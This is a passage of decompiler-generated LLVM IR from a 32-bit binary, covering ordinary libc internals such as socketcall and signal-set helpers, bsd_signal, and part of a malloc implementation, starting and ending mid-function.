  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804a147 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804a14e = call i32 @__socketcall(i32 1, i32 %v2_804a147)
  ret i32 %v2_804a14e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 4, 3, 0, 2, 1 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804a158 = load i32, i32* @ebx, align 4
  %v15_804a159 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804a16d = icmp eq i32 %arg2, -1
  br i1 %v10_804a16d, label %dec_label_pc_804a17b, label %dec_label_pc_804a172

dec_label_pc_804a172:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804a17b, label %dec_label_pc_804a176

dec_label_pc_804a176:                             ; preds = %dec_label_pc_804a172
  %v7_804a179 = icmp sgt i32 %arg1, 64
  br i1 %v7_804a179, label %dec_label_pc_804a17b, label %dec_label_pc_804a188

dec_label_pc_804a17b:                             ; preds = %dec_label_pc_804a176, %dec_label_pc_804a172, %entry
  %v1_804a17b = call i32 @__errno_location(i32 %v0_804a158)
  store i32 %v1_804a17b, i32* %eax.global-to-local, align 4
  %v1_804a180 = inttoptr i32 %v1_804a17b to i32*
  store i32 22, i32* %v1_804a180, align 4
  br label %dec_label_pc_804a1fc

dec_label_pc_804a188:                             ; preds = %dec_label_pc_804a176
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a196

dec_label_pc_804a196:                             ; preds = %dec_label_pc_804a196.dec_label_pc_804a196_crit_edge, %dec_label_pc_804a188
  %v0_804a196 = phi i32 [ %v15_804a159, %dec_label_pc_804a188 ], [ %v0_804a196.pre, %dec_label_pc_804a196.dec_label_pc_804a196_crit_edge ]
  %v1_804a1a117 = phi i32 [ 31, %dec_label_pc_804a188 ], [ %v1_804a1a1, %dec_label_pc_804a196.dec_label_pc_804a196_crit_edge ]
  %v2_804a196 = mul i32 %v1_804a1a117, 4
  %v3_804a196 = add i32 %v2_804a196, 160
  %v4_804a196 = add i32 %v3_804a196, %v0_804a196
  %v5_804a196 = inttoptr i32 %v4_804a196 to i32*
  store i32 0, i32* %v5_804a196, align 4
  %v0_804a1a1.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804a1a1 = add i32 %v0_804a1a1.pre, -1
  %v9_804a1a1 = icmp slt i32 %v1_804a1a1, 0
  store i32 %v1_804a1a1, i32* %eax.global-to-local, align 4
  %v1_804a1a2 = icmp eq i1 %v9_804a1a1, false
  br i1 %v1_804a1a2, label %dec_label_pc_804a196.dec_label_pc_804a196_crit_edge, label %dec_label_pc_804a1a4

dec_label_pc_804a196.dec_label_pc_804a196_crit_edge: ; preds = %dec_label_pc_804a196
  %v0_804a196.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a196

dec_label_pc_804a1a4:                             ; preds = %dec_label_pc_804a196
  %v0_804a1a4 = load i32, i32* @edx, align 4
  %v2_804a1a7 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804a1a7, i32* %eax.global-to-local, align 4
  %v4_804a1af = call i32 @__sigaddset(i32 %v2_804a1a7, i32 %arg1, i32 %v0_804a1a4, i32 %v0_804a1a4)
  store i32 %v4_804a1af, i32* %eax.global-to-local, align 4
  %v2_804a1b7 = icmp slt i32 %v4_804a1af, 0
  br i1 %v2_804a1b7, label %dec_label_pc_804a1fc, label %dec_label_pc_804a1bb

dec_label_pc_804a1bb:                             ; preds = %dec_label_pc_804a1a4
  %v4_804a1c3 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8054580.35 to i32), i32 %arg1, i32 %v4_804a1af, i32 %v4_804a1af)
  %v2_804a1dc = ptrtoint i32* %stack_var_-284 to i32
  %v2_804a1e1 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804a1e1, i32* %eax.global-to-local, align 4
  %v4_804a1ea = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804a1dc)
  store i32 %v4_804a1ea, i32* %eax.global-to-local, align 4
  %v2_804a1f2 = icmp slt i32 %v4_804a1ea, 0
  br i1 %v2_804a1f2, label %dec_label_pc_804a1fc, label %dec_label_pc_804a1f6

dec_label_pc_804a1f6:                             ; preds = %dec_label_pc_804a1bb
  %v3_804a1f6 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804a1ff

dec_label_pc_804a1fc:                             ; preds = %dec_label_pc_804a1bb, %dec_label_pc_804a1a4, %dec_label_pc_804a17b
  br label %dec_label_pc_804a1ff

dec_label_pc_804a1ff:                             ; preds = %dec_label_pc_804a1f6, %dec_label_pc_804a1fc
  %storemerge = phi i32 [ -1, %dec_label_pc_804a1fc ], [ %v3_804a1f6, %dec_label_pc_804a1f6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804a158, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804a1a1, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804a1ff, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804a216 = add i32 %arg2, -1
  %v1_804a219 = urem i32 %v1_804a216, 32
  %v2_804a219 = icmp eq i32 %v1_804a219, 0
  %v2_804a21c = udiv i32 %v1_804a216, 32
  br i1 %v2_804a219, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804a21f = shl i32 1, %v1_804a219
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804a221 = phi i32 [ 1, %entry ], [ %v5_804a21f, %bb ]
  %v2_804a221 = mul nuw nsw i32 %v2_804a21c, 4
  %v3_804a221 = add i32 %v2_804a221, %arg1
  %v4_804a221 = inttoptr i32 %v3_804a221 to i32*
  %v5_804a221 = load i32, i32* %v4_804a221, align 4
  %v7_804a221 = and i32 %v5_804a221, %v6_804a221
  %v8_804a221 = icmp eq i32 %v7_804a221, 0
  %v1_804a225 = icmp eq i1 %v8_804a221, false
  %v2_804a225 = zext i1 %v1_804a225 to i32
  ret i32 %v2_804a225

; uselistorder directives
  uselistorder i32 %v1_804a219, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a22c = load i32, i32* @ebx, align 4
  store i32 %v0_804a22c, i32* %stack_var_-4, align 4
  %v1_804a23a = add i32 %arg2, -1
  %v1_804a23d = urem i32 %v1_804a23a, 32
  %v2_804a23d = icmp eq i32 %v1_804a23d, 0
  store i32 %v1_804a23d, i32* @ecx, align 4
  %v2_804a240 = udiv i32 %v1_804a23a, 32
  store i32 %v2_804a240, i32* @edx, align 4
  br i1 %v2_804a23d, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804a243 = shl i32 1, %v1_804a23d
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804a245 = phi i32 [ 1, %entry ], [ %v5_804a243, %bb ]
  %v2_804a245 = mul nuw nsw i32 %v2_804a240, 4
  %v3_804a245 = add i32 %v2_804a245, %arg1
  %v4_804a245 = inttoptr i32 %v3_804a245 to i32*
  %v5_804a245 = load i32, i32* %v4_804a245, align 4
  %v7_804a245 = or i32 %v5_804a245, %v6_804a245
  store i32 %v7_804a245, i32* %v4_804a245, align 4
  %v2_804a24a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a24a, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804a240, { 1, 0 }
  uselistorder i32 %v1_804a23d, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804a25a = add i32 %arg2, -1
  %v1_804a25d = urem i32 %v1_804a25a, 32
  %v2_804a25d = icmp eq i32 %v1_804a25d, 0
  %v2_804a260 = udiv i32 %v1_804a25a, 32
  br i1 %v2_804a25d, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_804a263 = shl i32 -2, %v1_804a25d
  %v5_804a263 = sub nsw i32 32, %v1_804a25d
  %v6_804a263 = lshr i32 -2, %v5_804a263
  %v7_804a263 = or i32 %v6_804a263, %v4_804a263
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804a265 = phi i32 [ -2, %entry ], [ %v7_804a263, %bb ]
  %v2_804a265 = mul nuw nsw i32 %v2_804a260, 4
  %v3_804a265 = add i32 %v2_804a265, %arg1
  %v4_804a265 = inttoptr i32 %v3_804a265 to i32*
  %v5_804a265 = load i32, i32* %v4_804a265, align 4
  %v7_804a265 = and i32 %v5_804a265, %v6_804a265
  store i32 %v7_804a265, i32* %v4_804a265, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804a25d, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804a26c = load i32, i32* @eax, align 4
  %v6_804a27f = icmp ugt i32 %v0_804a26c, 16777215
  br i1 %v6_804a27f, label %dec_label_pc_804a290, label %dec_label_pc_804a281

dec_label_pc_804a281:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804a26c, 256
  %v2_804a26f = udiv i32 %v0_804a26c, 256
  %v2_804a281 = call i32 @llvm.ctlz.i32(i32 %v2_804a26f, i1 true)
  %v3_804a281 = xor i32 %v2_804a281, 31
  %v5_804a281 = select i1 %tmp, i32 95, i32 %v3_804a281
  %v1_804a284 = add nuw nsw i32 %v5_804a281, 6
  store i32 %v1_804a284, i32* @ecx, align 4
  %v2_804a287 = urem i32 %v1_804a284, 32
  %v4_804a287 = icmp eq i32 %v2_804a287, 0
  br i1 %v4_804a287, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804a281
  %v5_804a287 = lshr i32 %v0_804a26c, %v2_804a287
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804a281, %bb
  %v0_804a289 = phi i32 [ %v0_804a26c, %dec_label_pc_804a281 ], [ %v5_804a287, %bb ]
  %v1_804a289 = urem i32 %v0_804a289, 4
  %v2_804a28c = mul nuw nsw i32 %v5_804a281, 4
  %v3_804a28c = or i32 %v1_804a289, 32
  %v4_804a28c = add nuw nsw i32 %v3_804a28c, %v2_804a28c
  br label %dec_label_pc_804a290

dec_label_pc_804a290:                             ; preds = %entry, %bb4
  %v0_804a291 = phi i32 [ 95, %entry ], [ %v4_804a28c, %bb4 ]
  ret i32 %v0_804a291

; uselistorder directives
  uselistorder i32 %v2_804a287, { 1, 0 }
  uselistorder i32 %v0_804a26c, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804a290, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a292 = load i32, i32* @ebp, align 4
  %v0_804a293 = load i32, i32* @edi, align 4
  %v0_804a294 = load i32, i32* @esi, align 4
  %v0_804a295 = load i32, i32* @ebx, align 4
  store i32 %v0_804a295, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804a2a7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a2a7, i32* @eax, align 4
  store i32 %v2_804a2a7, i32* %stack_var_-92, align 4
  %v2_804a2ac = call i32 @__pthread_return_void(i32 %v2_804a2a7, i32 134526403)
  store i32 %v2_804a2ac, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052044.36 to i32), i32* %stack_var_-92, align 4
  %v1_804a2b8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052044.36 to i32))
  store i32 %v1_804a2b8, i32* %eax.global-to-local, align 4
  %v0_804a2c0 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804a2c0, -32
  br i1 %tmp125, label %dec_label_pc_804a2d7, label %dec_label_pc_804a2c5

dec_label_pc_804a2c5:                             ; preds = %entry
  %v0_804a2c5 = load i32, i32* %stack_var_-92, align 4
  %v1_804a2c5 = call i32 @__errno_location(i32 %v0_804a2c5)
  store i32 %v1_804a2c5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804a2cc = inttoptr i32 %v1_804a2c5 to i32*
  store i32 12, i32* %v1_804a2cc, align 4
  br label %dec_label_pc_804a9fc

dec_label_pc_804a2d7:                             ; preds = %entry
  %v1_804a2d7 = add i32 %v0_804a2c0, 11
  %tmp126 = icmp ult i32 %v1_804a2d7, 16
  br i1 %tmp126, label %dec_label_pc_804a2ee, label %dec_label_pc_804a2e7

dec_label_pc_804a2e7:                             ; preds = %dec_label_pc_804a2d7
  %v1_804a2e7 = and i32 %v1_804a2d7, -8
  br label %dec_label_pc_804a2ee

dec_label_pc_804a2ee:                             ; preds = %dec_label_pc_804a2d7, %dec_label_pc_804a2e7
  %storemerge136 = phi i32 [ %v1_804a2e7, %dec_label_pc_804a2e7 ], [ %v1_804a2d7, %dec_label_pc_804a2d7 ]
  %v1_804a686 = phi i32 [ %v1_804a2e7, %dec_label_pc_804a2e7 ], [ 16, %dec_label_pc_804a2d7 ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_804a2ee = load i8, i8* @global_var_8054600.37, align 1
  %v1_804a2ee = sext i8 %v0_804a2ee to i32
  store i32 %v1_804a2ee, i32* @ebx, align 4
  %v3_804a2f4 = urem i8 %v0_804a2ee, 2
  %v4_804a2f4 = icmp eq i8 %v3_804a2f4, 0
  %v1_804a2f7 = icmp eq i1 %v4_804a2f4, false
  br i1 %v1_804a2f7, label %dec_label_pc_804a316, label %dec_label_pc_804a2f9

dec_label_pc_804a2f9:                             ; preds = %dec_label_pc_804a2ee
  %v2_804a2f9 = icmp eq i8 %v0_804a2ee, 0
  %v1_804a2fb = icmp eq i1 %v2_804a2f9, false
  br i1 %v1_804a2fb, label %dec_label_pc_804a5f1, label %dec_label_pc_804a301

dec_label_pc_804a301:                             ; preds = %dec_label_pc_804a2f9
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a309 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804a309, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a5f1

dec_label_pc_804a316:                             ; preds = %dec_label_pc_804a2ee
  %v11_804a316 = trunc i32 %v1_804a686 to i8
  %v8_804a31a = icmp ugt i8 %v11_804a316, %v0_804a2ee
  br i1 %v8_804a31a, label %dec_label_pc_804a337, label %dec_label_pc_804a31c

dec_label_pc_804a31c:                             ; preds = %dec_label_pc_804a316
  %v2_804a320 = udiv i32 %v1_804a686, 2
  store i32 %v2_804a320, i32* %eax.global-to-local, align 4
  %v1_804a322 = add i32 %v2_804a320, ptrtoint (i8* @global_var_8054600.37 to i32)
  store i32 %v1_804a322, i32* @ecx, align 4
  %v1_804a328 = add i32 %v2_804a320, add (i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32 -4)
  %v2_804a328 = inttoptr i32 %v1_804a328 to i32*
  %v3_804a328 = load i32, i32* %v2_804a328, align 4
  store i32 %v3_804a328, i32* @edx, align 4
  %v1_804a32b = icmp eq i32 %v3_804a328, 0
  br i1 %v1_804a32b, label %dec_label_pc_804a337, label %dec_label_pc_804a32f

dec_label_pc_804a32f:                             ; preds = %dec_label_pc_804a31c
  %v1_804a32f = add i32 %v3_804a328, 8
  %v2_804a32f = inttoptr i32 %v1_804a32f to i32*
  %v3_804a32f = load i32, i32* %v2_804a32f, align 4
  store i32 %v3_804a32f, i32* %eax.global-to-local, align 4
  store i32 %v3_804a32f, i32* %v2_804a328, align 4
  br label %dec_label_pc_804a370

dec_label_pc_804a337:                             ; preds = %dec_label_pc_804a31c, %dec_label_pc_804a316
  %v8_804a337 = icmp ult i32 %v1_804a686, 255
  %v6_804a33f = icmp ugt i32 %v1_804a686, 255
  store i32 %v1_804a686, i32* @eax, align 4
  br i1 %v6_804a33f, label %dec_label_pc_804a378, label %dec_label_pc_804a341

dec_label_pc_804a341:                             ; preds = %dec_label_pc_804a337
  %v2_804a345 = udiv i32 %v1_804a686, 8
  store i32 %v2_804a345, i32* %eax.global-to-local, align 4
  %v1_804a34c = mul nuw i32 %v2_804a345, 8
  %v2_804a34c = add i32 %v1_804a34c, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a34c, i32* @ecx, align 4
  %v1_804a353 = add i32 %v1_804a34c, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a353 = inttoptr i32 %v1_804a353 to i32*
  %v3_804a353 = load i32, i32* %v2_804a353, align 4
  store i32 %v3_804a353, i32* @edx, align 4
  %v12_804a356 = icmp eq i32 %v3_804a353, %v2_804a34c
  br i1 %v12_804a356, label %dec_label_pc_804a474.preheader, label %dec_label_pc_804a35e

dec_label_pc_804a35e:                             ; preds = %dec_label_pc_804a341
  store i32 %v1_804a686, i32* %ebx.global-to-local, align 4
  %v1_804a362 = add i32 %v3_804a353, 12
  %v2_804a362 = inttoptr i32 %v1_804a362 to i32*
  %v3_804a362 = load i32, i32* %v2_804a362, align 4
  store i32 %v3_804a362, i32* %eax.global-to-local, align 4
  store i32 %v3_804a362, i32* %v2_804a353, align 4
  %v0_804a368 = load i32, i32* @edx, align 4
  %v1_804a368 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a368 = add i32 %v0_804a368, 4
  %v3_804a368 = add i32 %v2_804a368, %v1_804a368
  %v4_804a368 = inttoptr i32 %v3_804a368 to i32*
  %v5_804a368 = load i32, i32* %v4_804a368, align 4
  %v6_804a368 = or i32 %v5_804a368, 1
  store i32 %v6_804a368, i32* %v4_804a368, align 4
  %v0_804a36d = load i32, i32* @ecx, align 4
  %v1_804a36d = load i32, i32* %eax.global-to-local, align 4
  %v2_804a36d = add i32 %v1_804a36d, 8
  %v3_804a36d = inttoptr i32 %v2_804a36d to i32*
  store i32 %v0_804a36d, i32* %v3_804a36d, align 4
  br label %dec_label_pc_804a370

dec_label_pc_804a370:                             ; preds = %dec_label_pc_804a70d, %dec_label_pc_804a71f, %dec_label_pc_804a32f, %dec_label_pc_804a35e
  %v0_804a370 = load i32, i32* @edx, align 4
  %v1_804a370 = add i32 %v0_804a370, 8
  store i32 %v1_804a370, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a9eb

dec_label_pc_804a378:                             ; preds = %dec_label_pc_804a337
  %v0_804a37c = call i32 @__malloc_largebin_index()
  store i32 %v0_804a37c, i32* %eax.global-to-local, align 4
  %v3_804a381 = and i8 %v0_804a2ee, 2
  %v4_804a381 = icmp eq i8 %v3_804a381, 0
  %v6_804a381 = zext i8 %v3_804a381 to i32
  %v9_804a381 = and i32 %v1_804a2ee, -256
  %v10_804a381 = or i32 %v9_804a381, %v6_804a381
  store i32 %v10_804a381, i32* @ebx, align 4
  br i1 %v4_804a381, label %dec_label_pc_804a474.preheader, label %dec_label_pc_804a38e

dec_label_pc_804a38e:                             ; preds = %dec_label_pc_804a378
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a396 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804a396, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a474.preheader

dec_label_pc_804a474.preheader:                   ; preds = %dec_label_pc_804a38e, %dec_label_pc_804a341, %dec_label_pc_804a378
  %stack_var_-40.0.ph = phi i32 [ %v2_804a345, %dec_label_pc_804a341 ], [ %v0_804a37c, %dec_label_pc_804a38e ], [ %v0_804a37c, %dec_label_pc_804a378 ]
  %v1_804a3ca = add i32 %v1_804a686, 16
  %v0_804a474107 = load i32, i32* @global_var_8054640.41, align 64
  store i32 %v0_804a474107, i32* @ebp, align 4
  %v9_804a47a109 = icmp eq i32 %v0_804a474107, 134563380
  %v1_804a480110 = icmp eq i1 %v9_804a47a109, false
  br i1 %v1_804a480110, label %dec_label_pc_804a3a3, label %dec_label_pc_804a486

dec_label_pc_804a3a3:                             ; preds = %dec_label_pc_804a474.preheader, %bb84
  %v0_804a474111 = phi i32 [ %v0_804a474, %bb84 ], [ %v0_804a474107, %dec_label_pc_804a474.preheader ]
  %v1_804a3a3 = add i32 %v0_804a474111, 4
  %v2_804a3a3 = inttoptr i32 %v1_804a3a3 to i32*
  %v3_804a3a3 = load i32, i32* %v2_804a3a3, align 4
  %v1_804a3a6 = add i32 %v0_804a474111, 12
  %v2_804a3a6 = inttoptr i32 %v1_804a3a6 to i32*
  %v3_804a3a6 = load i32, i32* %v2_804a3a6, align 4
  store i32 %v3_804a3a6, i32* @edx, align 4
  %v1_804a3a9 = and i32 %v3_804a3a3, -4
  store i32 %v1_804a3a9, i32* @edi, align 4
  br i1 %v6_804a33f, label %dec_label_pc_804a3d5, label %dec_label_pc_804a3b6

dec_label_pc_804a3b6:                             ; preds = %dec_label_pc_804a3a3
  %v9_804a3b6 = icmp eq i32 %v3_804a3a6, 134563380
  %v1_804a3bc = icmp eq i1 %v9_804a3b6, false
  br i1 %v1_804a3bc, label %dec_label_pc_804a3d5, label %dec_label_pc_804a3be

dec_label_pc_804a3be:                             ; preds = %dec_label_pc_804a3b6
  %v1_804a3be = load i32, i32* @global_var_8054630.39, align 16
  %v12_804a3be = icmp eq i32 %v0_804a474111, %v1_804a3be
  %v1_804a3c4 = icmp eq i1 %v12_804a3be, false
  br i1 %v1_804a3c4, label %dec_label_pc_804a3d5, label %dec_label_pc_804a3c6

dec_label_pc_804a3c6:                             ; preds = %dec_label_pc_804a3be
  store i32 %v1_804a3ca, i32* %eax.global-to-local, align 4
  %v6_804a3cf = icmp ugt i32 %v1_804a3a9, %v1_804a3ca
  br i1 %v6_804a3cf, label %dec_label_pc_804a986, label %dec_label_pc_804a3d5

dec_label_pc_804a3d5:                             ; preds = %dec_label_pc_804a3c6, %dec_label_pc_804a3be, %dec_label_pc_804a3b6, %dec_label_pc_804a3a3
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %eax.global-to-local, align 4
  %v2_804a3da = add i32 %v3_804a3a6, 8
  %v3_804a3da = inttoptr i32 %v2_804a3da to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v3_804a3da, align 4
  %v0_804a3dd = load i32, i32* @edx, align 4
  store i32 %v0_804a3dd, i32* @global_var_8054640.41, align 4
  %v0_804a3e0 = load i32, i32* @edi, align 4
  %v15_804a3e0 = icmp eq i32 %v0_804a3e0, %v1_804a686
  br i1 %v15_804a3e0, label %dec_label_pc_804a9c7, label %dec_label_pc_804a3ea

dec_label_pc_804a3ea:                             ; preds = %dec_label_pc_804a3d5
  %v6_804a3f0 = icmp ugt i32 %v0_804a3e0, 255
  br i1 %v6_804a3f0, label %dec_label_pc_804a403, label %dec_label_pc_804a3f2

dec_label_pc_804a3f2:                             ; preds = %dec_label_pc_804a3ea
  %v2_804a3f4 = udiv i32 %v0_804a3e0, 8
  store i32 %v2_804a3f4, i32* %esi.global-to-local, align 4
  %v1_804a3f7 = mul nuw i32 %v2_804a3f4, 8
  %v2_804a3f7 = add i32 %v1_804a3f7, 134563372
  store i32 %v2_804a3f7, i32* @ebx, align 4
  %v1_804a3fe = add i32 %v1_804a3f7, 134563380
  %v2_804a3fe = inttoptr i32 %v1_804a3fe to i32*
  %v3_804a3fe = load i32, i32* %v2_804a3fe, align 4
  store i32 %v3_804a3fe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a44c

dec_label_pc_804a403:                             ; preds = %dec_label_pc_804a3ea
  store i32 %v0_804a3e0, i32* @eax, align 4
  %v0_804a405 = call i32 @__malloc_largebin_index()
  store i32 %v0_804a405, i32* %esi.global-to-local, align 4
  %v1_804a40c = mul i32 %v0_804a405, 8
  %v2_804a40c = add i32 %v1_804a40c, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a40c, i32* %eax.global-to-local, align 4
  %v1_804a413 = add i32 %v1_804a40c, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 8)
  %v2_804a413 = inttoptr i32 %v1_804a413 to i32*
  %v3_804a413 = load i32, i32* %v2_804a413, align 4
  store i32 %v3_804a413, i32* %edx.global-to-local, align 4
  store i32 %v3_804a413, i32* @ebx, align 4
  %v12_804a41c = icmp eq i32 %v3_804a413, %v2_804a40c
  br i1 %v12_804a41c, label %dec_label_pc_804a44c, label %dec_label_pc_804a420

dec_label_pc_804a420:                             ; preds = %dec_label_pc_804a403
  %v1_804a420 = add i32 %v1_804a40c, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a420 = inttoptr i32 %v1_804a420 to i32*
  %v3_804a420 = load i32, i32* %v2_804a420, align 4
  store i32 %v3_804a420, i32* @ebx, align 4
  %v0_804a423 = load i32, i32* @edi, align 4
  %v2_804a423 = add i32 %v3_804a420, 4
  %v3_804a423 = inttoptr i32 %v2_804a423 to i32*
  %v4_804a423 = load i32, i32* %v3_804a423, align 4
  %v10_804a423 = icmp ult i32 %v0_804a423, %v4_804a423
  %v1_804a426 = icmp eq i1 %v10_804a423, false
  br i1 %v1_804a426, label %dec_label_pc_804a42e, label %dec_label_pc_804a44c

dec_label_pc_804a42e:                             ; preds = %dec_label_pc_804a420
  %v1_804a430 = or i32 %v0_804a423, 1
  store i32 %v1_804a430, i32* %eax.global-to-local, align 4
  store i32 %v3_804a413, i32* %ebx.global-to-local, align 4
  %v2_804a444101 = add i32 %v3_804a413, 4
  %v3_804a444102 = inttoptr i32 %v2_804a444101 to i32*
  %v4_804a444103 = load i32, i32* %v3_804a444102, align 4
  %v10_804a444104 = icmp ult i32 %v1_804a430, %v4_804a444103
  br i1 %v10_804a444104, label %dec_label_pc_804a435, label %dec_label_pc_804a449

dec_label_pc_804a435:                             ; preds = %dec_label_pc_804a42e, %dec_label_pc_804a435
  %v0_804a449105 = phi i32 [ %v3_804a439, %dec_label_pc_804a435 ], [ %v3_804a413, %dec_label_pc_804a42e ]
  store i32 %v0_804a449105, i32* %ecx.global-to-local, align 4
  %v1_804a439 = add i32 %v0_804a449105, 8
  %v2_804a439 = inttoptr i32 %v1_804a439 to i32*
  %v3_804a439 = load i32, i32* %v2_804a439, align 4
  store i32 %v3_804a439, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a439, i32* %ebx.global-to-local, align 4
  %v2_804a444 = add i32 %v3_804a439, 4
  %v3_804a444 = inttoptr i32 %v2_804a444 to i32*
  %v4_804a444 = load i32, i32* %v3_804a444, align 4
  %v10_804a444 = icmp ult i32 %v1_804a430, %v4_804a444
  br i1 %v10_804a444, label %dec_label_pc_804a435, label %dec_label_pc_804a449

dec_label_pc_804a449:                             ; preds = %dec_label_pc_804a435, %dec_label_pc_804a42e
  %v0_804a449.lcssa = phi i32 [ %v3_804a413, %dec_label_pc_804a42e ], [ %v3_804a439, %dec_label_pc_804a435 ]
  %v1_804a449 = add i32 %v0_804a449.lcssa, 12
  %v2_804a449 = inttoptr i32 %v1_804a449 to i32*
  %v3_804a449 = load i32, i32* %v2_804a449, align 4
  store i32 %v3_804a449, i32* @ebx, align 4
  br label %dec_label_pc_804a44c

dec_label_pc_804a44c:                             ; preds = %dec_label_pc_804a3f2, %dec_label_pc_804a420, %dec_label_pc_804a403, %dec_label_pc_804a449
  %v0_804a44c = phi i32 [ %v0_804a405, %dec_label_pc_804a403 ], [ %v0_804a405, %dec_label_pc_804a449 ], [ %v0_804a405, %dec_label_pc_804a420 ], [ %v2_804a3f4, %dec_label_pc_804a3f2 ]
  %stack_var_-64.1 = phi i32 [ %v2_804a40c, %dec_label_pc_804a403 ], [ %v0_804a449.lcssa, %dec_label_pc_804a449 ], [ %v2_804a40c, %dec_label_pc_804a420 ], [ %v3_804a3fe, %dec_label_pc_804a3f2 ]
  %v1_804a44e = urem i32 %v0_804a44c, 32
  %v2_804a44e = icmp eq i32 %v1_804a44e, 0
  store i32 %v1_804a44e, i32* %esi.global-to-local, align 4
  store i32 %v1_804a44e, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804a458 = sdiv i32 %v0_804a44c, 32
  store i32 %v2_804a458, i32* %edx.global-to-local, align 4
  br i1 %v2_804a44e, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804a44c
  %v5_804a45b = shl i32 1, %v1_804a44e
  store i32 %v5_804a45b, i32* %eax.global-to-local, align 4
  br label %bb84

